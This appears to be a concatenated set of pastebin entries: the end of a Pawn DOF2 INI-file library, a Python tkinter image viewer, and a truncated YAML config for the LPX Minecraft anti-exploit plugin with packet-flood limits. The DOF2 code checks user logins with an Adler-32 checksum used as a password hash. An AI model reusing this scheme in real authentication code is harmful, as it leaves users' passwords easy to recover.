							    Sections.FirstEntry [Sections.Count - 1] = Sections.LastEntry [Sections.Count - 1] = Entries.Count;
							    Entries.PreviousEntry [Entries.Count] = INVALID_ENTRY;
							}
							else
							{
								Entries.NextEntry [Sections.LastEntry [Sections.Count - 1]] = Entries.Count;
								Entries.PreviousEntry [Entries.Count] = Sections.LastEntry [Sections.Count - 1];
								Sections.LastEntry [Sections.Count - 1] = Entries.Count;
							}
							++Entries.Count;
						}
				    }
				    pos = 0;
				}
			}
			/*
			 * Sort list of entries by it's hashcodes in O(n * log n) time.
			 * (Worst case is actually O(n * n), however, this QuickSort implementation chooses a randomized pivot
			 * to minimize the chance for the worst case.)
			 */
			DOF2::SortEntries (SortedEntryList, 0, Entries.Count - 1, true);
			return fclose (f);
		}
	}
	return 0;
}

// Rather useless.
stock DOF2::ReparseFile (file [], extraid, bool: callback = true)
{
	if (file [0] && CurrentFile [0] && !strcmp (file, CurrentFile))
	{
	    CurrentFile [0] = '\0';
		return DOF2::ParseFile (file, extraid, callback);
	}
	return 0;
}

private DOF2::ParseLine (const line [], key [], value [], keysize = sizeof (key), valuesize = sizeof (value))
{
	new
		pos,
		readpos;

	if ((pos = charfind (line, '=')) != -1)
	{
	    // Read key and value.
	    readpos = pos - 1;
		while (readpos >= 0 && line [readpos] == ' ')
		    --readpos;

		if (readpos >= 0 && keysize > (readpos + 1))
		{
			key [readpos + 1] = '\0';
			while (readpos >= 0)
			{
				key [readpos] = line [readpos];
				--readpos;
			}
		}
		else
		    return 0;

		readpos = pos + 1;
		++pos;
		while (line [readpos] == ' ')
		{
			++pos;
		    ++readpos;
		}

        if (line [readpos])
		{
		    while (readpos >= 0 && line [readpos] && valuesize > (readpos - pos + 1))
			{
				value [readpos - pos] = line [readpos];
				++readpos;
			}
			value [readpos - pos] = '\0';
		}
		else
		{
		    key [0] = value [0] = '\0';
		    return 0;
		}
		
		if (!strcmp (value, ""(null)"", true))
		    value [0] = '\0';
		return 1;
	}
	key [0] = value [0] = '\0';
	return 0;
}

stock DOF2::File (user [])
{
	new newfile [MAX_FILE_SIZE];
	format (newfile, sizeof (newfile), USER_FILE_PATH, DOF2::udb_encode (user));
	return newfile;
}

stock bool: DOF2::CheckLogin (file [], password [])
	return (file [0] && password [0] && DOF2::num_hash (password) == DOF2::GetInt (file, USER_PW_HASH_KEY));

/*-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=*/

stock DOF2::binstr (value, dest [], size = sizeof (dest))
{
	new buf [32 + 3] = ""0b"";
	for (new i = 0; i < 32; ++i)
	    buf [i + 2] = '0' + ((value >>> (31 - i)) & 1);

	DOF2::strcpy (dest, buf, size);
}
	//format (dest, size, ""0b%b"", value);

stock DOF2::hexstr (value, dest [], size = sizeof (dest))
{
	static const characters [] =
	{
	    '0', '1', '2', '3',
	    '4', '5', '6', '7',
	    '8', '9', 'A', 'B',
	    'C', 'D', 'E', 'F'
	};
	
	new buf [8 + 3] = ""0x"";
	
	for (new i = 0; i < 8; ++i)
		buf [2 + i] = characters [(value >>> ((7 - i) << 2)) & 0x0F];

	DOF2::strcpy (dest, buf, size);
}
	//format (dest, size, ""0x%x"", value);

stock DOF2::strhex (string [])
{
	new
		i,
		value;
		
	if (string [0] == '0' && (string [1] == 'x' || string [1] == 'X'))
		i = 2;

    while (string [i])
    {
		value <<= 4;
		switch (string [i])
		{
		    case '0' .. '9':
		        value |= string [i] - '0';

			case 'A' .. 'F':
			    value |= string [i] - 'A' + 10;

            case 'a' .. 'f':
			    value |= string [i] - 'a' + 10;

			default:
			    return 0;
		}
		++i;
    }
    return value;
}

stock DOF2::strbin (string [])
{
	new
	    i,
	    value;

	if (string [0] == '0' && (string [1] == 'b' || string [1] == 'B'))
	    i = 2;

	while (string [i])
	{
	    if (string [i] != '1' && string [i] != '0')
	        return 0;

		value <<= 1;
		value |= (string [i] - '0');
		++i;
	}
	return value;
}

/*-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=*/

private charfind (const string [], c)
{
	for (new i, len = strlen (string); i < len; ++i)
		if (string [i] == c)
		    return i;
	return -1;
}

private fwritechars (File: handle, const c [])
{
    new pos;
#if PACK_CONTENT == true
	while (c {pos})
	    fputchar (handle, c {pos++}, UseUTF8);
#else
    while (c [pos])
	    fputchar (handle, c [pos++], UseUTF8);
#endif
}

private DOF2::SortEntries (entries [][2], l, r, bool: randomize = true)
{
	if (r > l)
	{
		if (randomize)
		{
			new k = l + (random (65535) % (r - l + 1));
		  	DOF2::SwapSortedEntries (entries [k], entries [r]);
		}

		new
			i = l - 1,
			j = r,
			pivot = entries [r][0];

		while (i < j)
		{
			do
				++i;
			while (entries [i][0] <= pivot && i < r);

			do
			    --j;
			while (entries [j][0] >= pivot && j > l);

			if (i < j)
			    DOF2::SwapSortedEntries (entries [i], entries [j]);
		}
		DOF2::SwapSortedEntries (entries [i], entries [r]);
		DOF2::SortEntries (entries, l, i - 1, randomize);
		DOF2::SortEntries (entries, i + 1, r, randomize);
	}
}

private DOF2::SwapSortedEntries (a [2], b [2])
{
 	new c [2];
	c [0] = a [0];
	c [1] = a [1];
	a [0] = b [0];
	a [1] = b [1];
	b [0] = c [0];
	b [1] = c [1];
}

stock DOF2::SortAllSections (file [], bool: ignorecase = true, bool: ascending = true)
{
    if (file [0])
	{
	    if (!CurrentFile [0] || strcmp (CurrentFile, file)) // No file in buffer or the file you want to read from is not the file in the buffer.
	    	if (!DOF2::ParseFile (file, -1, false))
	    	    return 0;

		new
			entries [MAX_ENTRIES],
			keys [MAX_ENTRIES][MAX_LINE_SIZE],
			key [MAX_LINE_SIZE],
			value [MAX_LINE_SIZE],
	    #if PACK_CONTENT == true
			line [MAX_LINE_SIZE],
		#endif
			entry,
			i;

		for (new section = 0; section < Sections.Count; ++section)
		{
		    i = 0;
			entry = Sections.FirstEntry [section];
			while (entry != INVALID_ENTRY)
			{
	        #if PACK_CONTENT == true
		    	strunpack (line, Entries.Line [entry]);
			    DOF2::ParseLine (line, key, value);
			#else
			    DOF2::ParseLine (Entries.Line [entry], key, value);
			#endif
			    keys [i][0] = '\0';
			    strcat (keys [i], key);
			    entries [i] = entry;
			    entry = Entries.NextEntry [entry];
			    ++i;
			}

			if (i > 0)
				DOF2::SortSection_Internal (section, entries, keys, 0, i - 1, ignorecase, ascending);
		}
		return 1;
	}
	return 0;
}

stock DOF2::SortSection (file [], tag [], bool: ignorecase = true, bool: ascending = true)
{
	if (file [0])
	{
	    if (!CurrentFile [0] || strcmp (CurrentFile, file)) // No file in buffer or the file you want to read from is not the file in the buffer.
	    	if (!DOF2::ParseFile (file, -1, false))
	    	    return 0;

		new
		    section = INVALID_SECTION,
			entries [MAX_ENTRIES],
			keys [MAX_ENTRIES][MAX_LINE_SIZE],
			key [MAX_LINE_SIZE],
			buf [MAX_LINE_SIZE],
	    #if PACK_CONTENT == true
			line [MAX_LINE_SIZE],
		#endif
			entry,
			i;

		if (!tag [0])
			section = 0;
		else
		{
			for (i = 1; i < Sections.Count; ++i)
			{
			#if PACK_CONTENT == true
			    strunpack (buf, Sections.Tag [i]);
			    if (buf [0] && !strcmp (tag, buf, !CaseSensitive))
			    {
			        section = i;
			        break;
			    }
			#else
			    if (Sections.Tag [i][0] && !strcmp (tag, Sections.Tag [i], !CaseSensitive))
			    {
			        section = i;
			        break;
			    }
			#endif
			}
		}

		if (section != INVALID_SECTION)
		{
		    i = 0;
			entry = Sections.FirstEntry [section];
			while (entry != INVALID_ENTRY)
			{
	        #if PACK_CONTENT == true
		    	strunpack (line, Entries.Line [entry]);
			    DOF2::ParseLine (line, key, buf);
			#else
			    DOF2::ParseLine (Entries.Line [entry], key, buf);
			#endif
			    keys [i][0] = '\0';
			    strcat (keys [i], key);
			    entries [i] = entry;
			    entry = Entries.NextEntry [entry];
			    ++i;
			}

			if (i > 0)
			{
				DOF2::SortSection_Internal (section, entries, keys, 0, i - 1, ignorecase, ascending);
		    	return 1;
			}
		}
	}
	return 0;
}

private DOF2::SortSection_Internal (section, entries [], keys [][], l, r, bool: ignorecase = true, bool: ascending = true)
{
	// Entries must be stored into an array...
    if (0 <= section < Sections.Count && r > l)
    {
        new
            i = l - 1,
            j = r,
			buf [MAX_LINE_SIZE];

        static
            pivot [MAX_LINE_SIZE]; // Must be static, otherwise too much memory usage during recursion ==> Script will crash!

        pivot [0] = '\0';
        strcat (pivot, keys [r]);

        while (i < j)
        {
            if (ascending)
            {
                do
                    ++i;
                while (strcmp (keys [i], pivot,  ignorecase) <= 0 && i < r);

                do
                    --j;
                while (strcmp (keys [j], pivot, ignorecase) >= 0 && j > l);
            }
            else
            {
                do
                    ++i;
                while (strcmp (keys [i], pivot,  ignorecase) >= 0 && i < r);

                do
                    --j;
                while (strcmp (keys [j], pivot, ignorecase) <= 0 && j > l);
            }

            if (i < j)
            {
                DOF2::SwapEntries (section, entries [i], entries [j]);

				DOF2::strcpy (buf, keys [i]);
				DOF2::strcpy (keys [i], keys [j], MAX_LINE_SIZE);
				DOF2::strcpy (keys [j], buf, MAX_LINE_SIZE);

				entries [i] ^= entries [j];
                entries [j] ^= entries [i];
                entries [i] ^= entries [j];
			}
        }

        if (i != r)
        {
            DOF2::SwapEntries (section, entries [i], entries [r]);

            DOF2::strcpy (buf, keys [i]);
			DOF2::strcpy (keys [i], keys [r], MAX_LINE_SIZE);
			DOF2::strcpy (keys [r], buf, MAX_LINE_SIZE);

            entries [i] ^= entries [r];
            entries [r] ^= entries [i];
            entries [i] ^= entries [r];
		}

        DOF2::SortSection_Internal (section, entries, keys, l, i - 1, ignorecase, ascending);
        DOF2::SortSection_Internal (section, entries, keys, i + 1, r, ignorecase, ascending);
    }
}

private DOF2::SwapEntries (section, entry1, entry2)
{
	// This swaps two entries in the entry list of a section. (Pointers are swapped)
	if (0 <= section < Sections.Count && 0 <= entry1 <= Entries.Count && 0 <= entry2 <= Entries.Count)
	{
	    if (entry1 == Sections.FirstEntry [section])
		    Sections.FirstEntry [section] = entry2;
		else if (entry2 == Sections.FirstEntry [section])
		    Sections.FirstEntry [section] = entry1;

	    if (entry1 == Sections.LastEntry [section])
		    Sections.LastEntry [section] = entry2;
		else if (entry2 == Sections.LastEntry [section])
		    Sections.LastEntry [section] = entry1;

		if (Entries.NextEntry [entry1] == entry2)
		{
		    Entries.NextEntry [entry1] = Entries.NextEntry [entry2];
		    Entries.PreviousEntry [entry2] = Entries.PreviousEntry [entry1];

		    if (Entries.PreviousEntry [entry1] != INVALID_ENTRY)
		        Entries.NextEntry [Entries.PreviousEntry [entry1]] = entry2;

	        if (Entries.NextEntry [entry2] != INVALID_ENTRY)
		        Entries.PreviousEntry [Entries.NextEntry [entry2]] = entry1;

		    Entries.NextEntry [entry2] = entry1;
		    Entries.PreviousEntry [entry1] = entry2;
		}
		else if (Entries.NextEntry [entry2] == entry1)
		{
		    Entries.NextEntry [entry2] = Entries.NextEntry [entry1];
		    Entries.PreviousEntry [entry1] = Entries.PreviousEntry [entry2];

		    if (Entries.PreviousEntry [entry2] != INVALID_ENTRY)
		        Entries.NextEntry [Entries.PreviousEntry [entry2]] = entry1;

	        if (Entries.NextEntry [entry1] != INVALID_ENTRY)
		        Entries.PreviousEntry [Entries.NextEntry [entry1]] = entry2;

		    Entries.NextEntry [entry1] = entry2;
		    Entries.PreviousEntry [entry2] = entry1;
		}
		else
		{
		    new pointer;

			if (Entries.PreviousEntry [entry1] != INVALID_ENTRY)
			    Entries.NextEntry [Entries.PreviousEntry [entry1]] = entry2;

		    if (Entries.NextEntry [entry1] != INVALID_ENTRY)
			    Entries.PreviousEntry [Entries.NextEntry [entry1]] = entry2;

			if (Entries.PreviousEntry [entry2] != INVALID_ENTRY)
			    Entries.NextEntry [Entries.PreviousEntry [entry2]] = entry1;

		    if (Entries.NextEntry [entry2] != INVALID_ENTRY)
			    Entries.PreviousEntry [Entries.NextEntry [entry2]] = entry1;

			pointer = Entries.NextEntry [entry1];
			Entries.NextEntry [entry1] = Entries.NextEntry [entry2];
			Entries.NextEntry [entry2] = pointer;

			pointer = Entries.PreviousEntry [entry1];
			Entries.PreviousEntry [entry1] = Entries.PreviousEntry [entry2];
			Entries.PreviousEntry [entry2] = pointer;
		}
	    return 1;
	}
	return 0;
}

private DOF2::HashKey (const key [])
{
	new
		h = -1,
		i,
		j;

	if (CaseSensitive)
	{
		while ((j = key [i++]))
			h = h * 33 + j;
	}
	else
	{
	    while ((j = tolower (key [i++])))
	        h = h * 33 + j;
	}
	return h;
}

/*-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=*/

stock DOF2::strcpy (dest [], const src [], size = sizeof (dest))
{
	dest [0] = '\0';
	strcat (dest, src, size);
}

// Replace [oldstr] with [newstr] in [srcstr] and copy write the new string to 'deststr'.

stock DOF2::strreplace (const newstr [], const oldstr [], const srcstr [], deststr [], bool: ignorecase = false, size = sizeof (deststr))
{
	new
	    newlen = strlen (newstr),
	    oldlen = strlen (oldstr),
	    srclen = strlen (srcstr),
	    idx,
		rep;

	for (new i = 0; i < srclen; ++i)
	{
	    if (idx < (size - 1))
	    {
		    if ((i + oldlen) <= srclen)
		    {
		        if (!strcmp (srcstr [i], oldstr, ignorecase, oldlen))
		        {
					deststr [idx] = '\0';
					strcat (deststr, newstr, size);
					++rep;
					idx += newlen;
					i += oldlen - 1;
				}
				else
					deststr [idx++] = srcstr [i];
		    }
		    else
		    	deststr [idx++] = srcstr [i];
	    }
		else
		    return rep;
	}
	deststr [idx] = '\0';
	return rep;
}

stock DOF2::udb_encode (nickname [])
{
	new
		buf [256],
		result [256];

	static const symbols [][2][] =
	{
	    {""_"", ""_00""},
		{"";"", ""_01""},
		{""!"", ""_02""},
		{""/"", ""_03""},
		{""\\"", ""_04""},
		{""["", ""_05""},
		{""]"", ""_06""},
		{""?"", ""_07""},
		{""."", ""_08""},
		{""*"", ""_09""},
		{""<"", ""_10""},
		{"">"", ""_11""},
		{""{"", ""_12""},
		{""}"", ""_13""},
		{"" "", ""_14""},
		{""\"""", ""_15""},
		{"":"", ""_16""},
		{""|"", ""_17""},
		{""="", ""_18""}
	};

	strcat (buf, nickname);
	for (new i = 0; i < sizeof (symbols); ++i)
	{
	    DOF2::strreplace (symbols [i][1], symbols [i][0], buf, result);
	    DOF2::strcpy (buf, result);
	}
	return result;
}

stock DOF2::udb_decode (nickname [])
{
	new
		buf [256],
		result [256];

	static const symbols [][2][] =
	{
	    {""_"", ""_00""},
		{"";"", ""_01""},
		{""!"", ""_02""},
		{""/"", ""_03""},
		{""\\"", ""_04""},
		{""["", ""_05""},
		{""]"", ""_06""},
		{""?"", ""_07""},
		{""."", ""_08""},
		{""*"", ""_09""},
		{""<"", ""_10""},
		{"">"", ""_11""},
		{""{"", ""_12""},
		{""}"", ""_13""},
		{"" "", ""_14""},
		{""\"""", ""_15""},
		{"":"", ""_16""},
		{""|"", ""_17""},
		{""="", ""_18""}
	};

	strcat (buf, nickname);
	for (new i = 0; i < sizeof (symbols); ++i)
	{
	    DOF2::strreplace (symbols [i][0], symbols [i][1], buf, result);
	    DOF2::strcpy (buf, result);
	}
	return result;
}

stock DOF2::num_hash (const buf [])
{
	new
		length = strlen (buf),
    	s1 = 1,
    	s2 = 0,
    	n;

    for (n = 0; n < length; n++)
	{
       s1 = (s1 + buf [n]) % 65521;
       s2 = (s2 + s1) % 65521;
    }
    return (s2 << 16) + s1;
}

/*-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=*/

#if defined DUDB_CONVERT

	#tryinclude <dutils>

	#define dUser(%0).( 			DOF2_GetString(DOF2_File(%0),
	#define dUserSet(%0).( 			DOF2_SetString(DOF2_File(%0),
	#define dUserINT(%0).( 			DOF2_GetInt(DOF2_File(%0),
	#define dUserSetINT(%0).( 		DOF2_SetInt(DOF2_File(%0),
	#define dUserFLOAT(%0).( 		DOF2_GetFloat(DOF2_File(%0),
	#define dUserSetFLOAT(%0).( 	DOF2_SetFloat(DOF2_File(%0),
	#define udb_Create(%0,%1)		DOF2_CreateFile(DOF2_File(%0),%1)
	#define udb_RenameUser(%0,%1)   DOF2_RenameFile(DOF2_File(%0),DOF2_File(%1))
	#define udb_Exists(%0)          DOF2_FileExists(DOF2_File(%0))
	#define udb_Remove(%0)          DOF2_RemoveFile(DOF2_File(%0))
	#define udb_CheckLogin(%0,%1)   DOF2_CheckLogin(DOF2_File(%0),%1)

	#if !defined _dudb_included
		#define _dudb_included
	#endif

#endif

#if defined DINI_CONVERT

	#define dini_Exists		        DOF2_FileExists
	#define dini_Remove         	DOF2_RemoveFile
	#define dini_Create         	DOF2_CreateFile
	#define dini_Set			    DOF2_SetString
	#define dini_Get         		DOF2_GetString
	#define dini_IntSet   			DOF2_SetInt
	#define dini_Int         		DOF2_GetInt
	#define dini_BoolSet            DOF2_SetBool
	#define dini_Bool               DOF2_GetBool
	#define dini_FloatSet 			DOF2_SetFloat
	#define dini_Float      		DOF2_GetFloat
	#define dini_Unset       		DOF2_Unset
	#define dini_Isset       		DOF2_IsSet

	#if !defined _dini_included
		#define _dini_included
	#endif

#endif

/*
#if defined DINI_CONVERT || defined DUDB_CONVERT

	#define udb_hash            	DOF2_num_hash
	#define num_hash            	DOF2_num_hash
	#define udb_encode              DOF2_udb_encode
	#define udb_decode              DOF2_udb_decode

#endif
*/
"
8hCXe5uw,PICTURE-VIEWER2.py,Najeebsk,Python,Thursday 29th of February 2024 06:38:13 AM CDT,"import tkinter as tk
from tkinter import filedialog
from PIL import Image, ImageTk
import glob

def insertfiles(folder):
    for filename in glob.glob(folder + ""/*.png""):
        lst.insert(tk.END, filename)
    for filename in glob.glob(folder + ""/*.jpg""):
        lst.insert(tk.END, filename)
    for filename in glob.glob(folder + ""/*.bmp""):
        lst.insert(tk.END, filename)    

def showimg(event):
    n = lst.curselection()
    if n:
        filename = lst.get(n[0])
        img = Image.open(filename)
        w_img, h_img = img.size
        
        # Get the dimensions of the window
        w_win = root.winfo_width()
        h_win = root.winfo_height()
        
        # Calculate the aspect ratio of the image and window
        aspect_ratio_img = w_img / h_img
        aspect_ratio_win = w_win / h_win
        
        if aspect_ratio_img > aspect_ratio_win:
            # Scale the image based on width
            new_w = w_win
            new_h = int(w_win / aspect_ratio_img)
        else:
            # Scale the image based on height
            new_h = h_win
            new_w = int(h_win * aspect_ratio_img)
        
        img = img.resize((new_w, new_h), Image.LANCZOS)  # Use LANCZOS for resampling
        photo = ImageTk.PhotoImage(img)
        canvas.config(width=new_w, height=new_h)
        canvas.create_image(0, 0, image=photo, anchor=tk.NW)
        canvas.image = photo

def browse_folder():
    folder_selected = filedialog.askdirectory()
    if folder_selected:
        lst.delete(0, tk.END)  # Clear the listbox
        insertfiles(folder_selected)

root = tk.Tk()
root.title(""NAJEEB IMAGE VIEWER"")
#root.configure(bg=""Green"")  # set background color
root.geometry(""800x600+300+50"")

# Create a frame to hold the listbox and scrollbar
frame = tk.Frame(root)
frame.pack(side=""left"", fill=""y"")

# Create a vertical scrollbar
scrollbar = tk.Scrollbar(frame, orient=""vertical"")

# Create the listbox with the scrollbar attached
lst = tk.Listbox(frame, width=15, yscrollcommand=scrollbar.set)
scrollbar.config(command=lst.yview)

# Pack the listbox and scrollbar
lst.pack(side=""left"", fill=""both"", expand=True)
scrollbar.pack(side=""right"", fill=""y"")

lst.bind(""<<ListboxSelect>>"", showimg)

# Insert files from the selected folder
insertfiles(""."")

# Add a button to browse for a folder
browse_button = tk.Button(root, text=""Browse Folder"", command=browse_folder)
browse_button.pack()

canvas = tk.Canvas(root)
canvas.pack(fill=tk.BOTH, expand=True)

root.mainloop()
"
vGtefimj,Untitled,Overwtime,YAML,Thursday 29th of February 2024 06:36:33 AM CDT,"license: ""null""
# Use this if you live in China
force-fallback: false

messages:
  main-color: ""&5""
  second-color: ""&d""

  prefix: ""%main-color%LPX >>""

  kick: ""&cYou are sending suspicious packets.""
  kick-alert: ""%prefix% %second-color%%player% &7was kicked""

  no-permission: ""%prefix% &cInsufficient permissions &7(%permission%)""
  invalid-arguments: ""%prefix% &cInvalid arguments!""
  injection-failure: ""%prefix% &cInjection failure!""
  update-found: ""%prefix% &aAn update was found!""
  null-address: ""%prefix% &cYou are joining with an invalid address!""

  alerts:
    permission: ""lpx.alerts""
    format: ""%prefix% %second-color%%player% &7failed %main-color%%check% %type% &7(%vl%/%max-vl%)""
    hover:
      - ""%main-color%Description:""
      - ""%second-color%%description%""
      - """"
      - ""%main-color%Infos: %infos%""
      - """"
    enabled: ""%prefix% &aAlerts enabled""
    disabled: ""%prefix% &cAlerts disabled""

options:
  # Enable this only if you have fake players who cause errors during the injection
  # WARNING: Enabling this will allow players to join even during injection failures
  silent-failures: false

  # For some reasons packets could be still received even if the player is not online
  # Disable this if you are having strange disconnect issues on LPX kicks
  discard-offline-packets: true

  # If this option is set to true, players won't be able to see the output of /lpx
  hidden-command: false

  # If activated, players with ""lpx.bypass"" permission will ignore checks
  bypass-permission: true

  # Add support for Geyser players (Bedrock Edition)
  geyser: false

  # Check if the plugin can be updated.
  # Permission: ""lpx.update""
  check-updates: true

  # Whether bStats should be loaded (https://bstats.org/plugin/bukkit/LPX/9156)
  bstats: true

  # Whether task that resets VL should be enabled
  clear-task:
    enabled: true
    # Repeat delay in seconds
    delay: 300

  printer:
    # Enable this if your server allows the use of printer/schematic mod, and you are not using our Printer's APIs
    automatic: false
    # Lower this value if players don't enter in printer mode correctly
    place-threshold: 10
    # Idle time after exiting printer mode
    disable-delay: 3000
    # Whether players with the permission should receive printer's alerts
    alerts: true
    # Permission to receive printer's alerts
    permission: ""lpx.alerts.printer""
    join: ""%prefix% %second-color%%player% &7joined printer mode (%mode%)""
    leave: ""%prefix% %second-color%%player% &7left printer mode""

  mechanics:
    # Sets a minimum time to reuse the nether portal. You can set it to -1 to disable.
    # WARNING: If you are using Intave put this to -1 to disable
    nether-portal-delay: 1000
    # Prevents the oneshot bow. -1 to disable
    max-arrow-velocity: 15
    # Prevents sheep extinction. -1 to disable
    shears-cooldown: 500
    # Prevents players to interact with the inventory on block break
    break-close-inventory: false
    # Prevents a strange crash exploit using redstone with trapdoors, rails and comparator (BETA)
    trapdoor-rail-redstone: true
    # Prevents players to open containers too fast (time in milliseconds. -1 to disable)
    interact-container-delay: 75

  # Server name, used for API integrations
  server: unnamed

  # Delay in milliseconds to wait before sending new alerts after a punishment
  punish-delay: 1000

  debug: false

  # If set to true LPX will look for the config.yml in ../config/config.yml
  external-config: false

packet-logger:
  enabled: false

  # Players ignored
  whitelist:
    - Ytnoos

  # List of packets to ignore
  # To find out correct names, open spigot's jar and find class' names
  # Path: net.minecraft.server
  ignore:
    - PacketPlayInFlying
    - PacketPlayInKeepAlive
    - PacketPlayInArmAnimation
    - PacketPlayInTransaction

checks:
  netty:
    a:
      enabled: true
      punish: false
      max-vl: 3
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
      options:
        # If this is set to automatic, then the max value below will assume one of these values based on your server version
        # 1.8 = 6144
        # 1.12 = 16384
        # 1.13 = 65536
        automatic: true
        # You can put this value to lower numbers (4096, 8192, 12228) to have much stricter protections
        max: 65536
    b:
      enabled: true
      punish: false
      max-vl: 3
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
      options:
        resolved: true
        min-length: 96
        max: 15
        max-characters: 255
        resize: true
  window:
    a:
      enabled: true
      punish: false
      max-vl: 5
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
      buffer:
        max: 3
        multiply: 0.25
        decay: 1
    b:
      enabled: true
      punish: false
      max-vl: 5
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
      buffer:
        max: 3
        multiply: 0.25
        decay: 1
    c:
      enabled: true
      punish: false
      max-vl: 5
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
    d:
      enabled: true
      punish: false
      max-vl: 2
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
  creative:
    a:
      enabled: true
      punish: false
      max-vl: 3
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
    b:
      enabled: true
      punish: false
      max-vl: 3
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
      options:
        max: 127
        min: 0
    c:
      enabled: true
      punish: false
      max-vl: 3
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
      options:
        max: 512
    d:
      enabled: true
      punish: false
      max-vl: 3
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
      options:
        max: 2048
    e:
      enabled: true
      punish: false
      max-vl: 3
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
      options:
        blacklist:
          - ""run_command""
          - ""translation.test.invalid""
    f:
      enabled: true
      punish: false
      max-vl: 3
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
      options:
        max: 64
    g:
      enabled: true
      punish: false
      max-vl: 3
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
  place:
    a:
      enabled: true
      punish: false
      max-vl: 30
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
      buffer:
        max: 5
        multiply: 0.5
        decay: 1
      options:
        max: 100
    b:
      enabled: true
      punish: false
      max-vl: 3
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
      options:
        max: 70
    c:
      enabled: false
      punish: false
      max-vl: 5
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
      buffer:
        max: 5
        multiply: 0.5
        decay: 1
      options:
        max: 40
  flood:
    a:
      enabled: true
      punish: false
      max-vl: 3
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending too many packets. :<'
      options:
        max: 1000
    b:
      enabled: true
      punish: false
      max-vl: 12
      min-vl: 8
      punish-commands:
        - 'lpx kick %player% &cYou are sending too many packets. >:'
      options:
        # The following strings are represented by 2 or 3 parameters:
        # PacketName | PPS | Interval(ms)
        # ""PacketPlayInArmAnimation,10,100"" Means this check will flag when a player sends 10 PacketPlayInArmAnimation packets in an interval of 100ms
        limits:
          #- ""PacketPlayInArmAnimation,50,500""
          - ""PacketPlayInUseItem,60,1000""
          - ""PacketPlayInBlockPlace,14,100""
          - ""PacketPlayInWindowClick,55,100""
          - ""PacketPlayInSetSlot,50,1000""
          - ""PacketPlayInPosition,25,100""
          - ""PacketPlayInAutoRecipe,15,1000""
          - ""PacketPlayInTabComplete,40,1000""
          - ""PacketPlayInUseEntity,40,1000""
          - ""PacketPlayInClientCommand,5,500""
          - ""ServerboundChatCommandPacket,5,500""
          #- ""PacketPlayInBlockDig,10,150""
    c:
      enabled: true
      punish: false
      max-vl: 10
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending too many packets. :o'
      options:
        max: 80
    d:
      enabled: true
      punish: false
      max-vl: 2
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending too many packets. o:'
      options:
        max: 10
        big-threshold: 256
        max-big: 4
    e:
      enabled: true
      punish: false
      max-vl: 2
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending too many packets. $:'
      options:
        threshold: 4096
        max: 8
        reset: 1000
    f:
      enabled: true
      punish: false
      max-vl: 2
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending too many packets. :$'
      options:
        max: 12
  position:
    a:
      enabled: true
      punish: false
      max-vl: 1
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
    b:
      enabled: true
      punish: false
      max-vl: 6
      min-vl: 1
      buffer:
        max: 2
        multiply: 0.5
        decay: 0.05
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
      options:
        delay: 2000
        hard: false
        ignore-fly: true
    c:
      enabled: true
      punish: false
      max-vl: 1
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
      options:
        max: 2048
    d:
      enabled: true
      punish: false
      max-vl: 1
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
      options:
        max: 100000
  payload:
    a:
      enabled: true
      punish: false
      max-vl: 3
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
    b:
      enabled: true
      punish: false
      max-vl: 2
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
      options:
        delay: 1000
        max: 15
    c:
      enabled: true
      punish: false
      max-vl: 3
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
    d:
      enabled: true
      punish: false
      max-vl: 5
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
    e:
      enabled: true
      punish: false
      max-vl: 1
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
  tab:
    a:
      enabled: true
      punish: true
      max-vl: 3
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious tab-complete packets.'
      options:
        starts:
          - ""/to ""
          - ""//to""
          - ""minecraft:advancement""
          - ""minecraft:attribute""
          - ""minecraft:ban""
          - ""minecraft:ban-ip""
